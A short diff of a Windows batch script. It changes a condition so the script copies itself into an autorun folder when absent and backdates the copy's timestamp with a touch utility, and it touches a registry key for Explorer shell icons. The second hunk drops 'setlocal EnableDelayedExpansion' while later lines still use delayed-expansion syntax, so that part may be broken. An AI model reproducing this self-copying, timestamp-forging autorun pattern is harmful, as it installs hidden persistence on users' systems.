@@ -73,7 +73,7 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 
-if exist "%path_autoRun1%\%~nx0" (
+if not exist "%path_autoRun1%\%~nx0" (
   copy /y "%~dpnx0" "%path_autoRun1%\"
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0" >nul
 )
@@ -250,8 +250,6 @@ exit
 
 
 :autoRun
-setlocal EnableDelayedExpansion
-
 set option3=%3
 if "!option3!" NEQ "" set "option3=!option3:"=!"
 
